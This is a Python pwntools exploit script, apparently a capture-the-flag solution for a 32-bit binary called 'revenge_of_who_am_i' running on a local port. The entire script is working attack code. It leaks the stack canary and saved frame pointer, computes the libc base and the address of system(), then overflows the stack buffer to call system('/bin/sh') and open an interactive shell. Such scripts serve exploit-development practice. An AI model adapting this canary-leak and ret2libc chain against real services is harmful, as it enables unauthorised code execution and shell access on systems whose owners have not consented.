from pwn import *

context.log_level = 'debug'
context.endian = 'little'
context.arch = 'i386'

libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')
# p = process('./revenge_of_who_am_i')
p = remote('127.0.0.1',61234)

# /bin/sh
# ret_addr -> system_addr
# old ebp
# canary
# stack 0x3e-8

p.recvuntil(b': ')

p.sendline(b'2')

payload1 = b''
payload1 += b'a'*(0x3e-11)

p.send(payload1)

aaa = p.recvuntil(b': ')
# 提取canary
addr_bytes = b'\x00'+ aaa[0x3a:0x3d]
canary_bytes = b'\x00'+ aaa[0x3a:0x3d]

# 转为整数（小端序）
canary = int.from_bytes(addr_bytes, 'little')
print(f"canary address: 0x{canary:08x}")  


# 提取old_ebp
addr_bytes = aaa[0x3d:0x41]
old_ebp_bytes = addr_bytes
old_ebp = int.from_bytes(addr_bytes, 'little')
change_old_ebp = old_ebp - 0x10 - 8
print(f"old_ebp address: 0x{old_ebp:08x}")  


payload2 = b''
payload2 += b'a'*(0x3e-11+8)

p.sendline(b'2')
p.send(payload2)

bbb = p.recvuntil(b': ')
# 提取ret_addr
addr_bytes = bbb[0x49:0x4d]

# 转为整数（小端序）
ret_addr = int.from_bytes(addr_bytes, 'little')
print(f"ret address: 0x{ret_addr:08x}") 

libc_base = ret_addr - 0x1519

offset = libc.symbols['system']

system_addr = libc_base + offset - 131072
print(f"system address: 0x{system_addr:08x}") 

binsh_addr = change_old_ebp - 20-4

payload3 = b''
payload3 += b'a'*(0x3e-11-8-1)+b'/bin/sh\x00'+b'a'+canary_bytes[1:]+p32(change_old_ebp)+p32(system_addr)+b's'*4+p32(binsh_addr)
p.sendline(b'2')

# print('pid'+str(proc.pidof(p)))
# pause()

p.send(payload3)

# print('pid'+str(proc.pidof(p)))
# pause()

p.recvuntil(b': ')
p.sendline(b'2')
payload4 = b'a'*(0x3e-11-8-1-4)+b'/bin/sh\x00'+b'\x00'*5
p.send(payload4)

p.recvuntil(b': ')
p.sendline(b'3')

p.interactive()